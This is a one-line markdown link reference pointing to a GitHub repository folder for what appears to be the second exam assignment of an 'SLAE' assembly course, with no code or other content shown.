[github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment2
